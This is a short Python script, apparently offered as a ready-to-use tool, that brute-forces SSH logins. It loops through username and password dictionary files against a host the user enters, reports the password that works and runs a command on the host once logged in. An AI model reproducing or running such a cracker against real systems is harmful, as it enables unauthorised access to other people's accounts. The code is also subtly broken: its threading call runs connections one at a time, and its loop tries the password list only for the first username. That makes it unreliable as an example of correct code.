from pexpect import pxssh
from threading import Thread
import argparse
import sys


def banner():
    print("""
 _____   _____   _   _
/  ___/ /  ___/ | | | |
| |___  | |___  | |_| |
\___  \ \___  \ |  _  |
 ___| |  ___| | | | | |
/_____/ /_____/ |_| |_|
""")


#发送命令
def send_command(s,command):
    s.sendline(command)
    s.prompt()
    print(s.before)


def connect(host,username,password):
    s = pxssh.pxssh()
    s.login(host,username,password)
    print("[ + ] Crack SSH Sucess",password)
    send_command(s,'cat /etc/issue')


banner()


p = argparse.ArgumentParser(usage='''Python ccav.py -L user.txt -P password.txt''',description='Crack SSH Password')
p.add_argument('-L',help='Load UserName dictory')
p.add_argument('-P',help='Load Password dictory')


args = p.parse_args()


with open(args.L) as User_file:
    with open(args.P) as Pass_file:
        host = input("Input Host:")
        #username = input("Input Username:")
        for User_line in User_file:
            username = User_line.strip('\n')
            for Pass_line in Pass_file.readlines():
                password = Pass_line.strip('\n')
                try:
                    t = Thread(connect(host,username,password))
                    t.start()
                except:
                    print(" [-] Connect SSH Fail ")

